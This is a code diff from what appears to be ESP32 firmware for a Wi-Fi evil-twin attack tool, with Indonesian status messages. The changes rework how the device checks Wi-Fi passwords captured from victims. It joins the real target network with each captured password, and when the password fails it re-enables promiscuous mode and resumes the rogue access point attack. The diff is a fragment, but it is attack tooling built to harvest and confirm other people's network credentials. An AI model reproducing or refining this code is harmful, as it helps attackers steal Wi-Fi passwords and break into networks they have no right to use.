@@ -1920,10 +1920,10 @@ void beginVerification() {
   verifyStart = millis();
   Serial.printf("[VERIFY] Attempt %d/%d starting\n",
                 verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
+  esp_wifi_set_promiscuous(false);
+  g_attackMode = ATK_IDLE;
   WiFi.disconnect();
-  delay(150);
-  WiFi.mode(WIFI_STA);
-  delay(150);
+  delay(100);
   WiFi.begin(targetSSID.c_str(), capturedPass.c_str(), g_targetChannel, g_targetBSSID);
 }
 
@@ -1939,7 +1939,6 @@ void updateVerification() {
     verifyState = 2;
     releaseAfterSuccess = millis() + SUCCESS_HOLD_MS;
     Serial.println("[VERIFY] PASSWORD BENAR");
-    startEvilTwinWithDeauth();
     return;
   }
 
@@ -1955,6 +1954,7 @@ void updateVerification() {
     if (verifyAttempts >= MAX_VERIFY_ATTEMPTS) {
       verifyState = 0;
       verifyAttempts = 0;
+      stopEvilTwin();
       tft.fillScreen(TFT_BLACK);
       drawHeader("MAX PERCOBAAN", TFT_RED);
       tft.setTextFont(2); tft.setTextColor(TFT_RED, TFT_BLACK);
@@ -1969,7 +1969,9 @@ void updateVerification() {
     }
 
     verifyState = 3;
-    startEvilTwinWithDeauth();
+    isReleasing = false;
+    esp_wifi_set_promiscuous(true);
+    g_attackMode = ATK_EVIL_TWIN;
 
     tft.fillScreen(TFT_BLACK);
     drawHeader("PASSWORD SALAH", TFT_RED);
@@ -3017,9 +3019,7 @@ void loop() {
     }
     if (isReleasing) {
       if (millis() - releaseTimer > RELEASE_DELAY_MS) {
-        stopEvilTwin();
         beginVerification();
-        drawEvilTwinRunning(0);
         return;
       }
     }
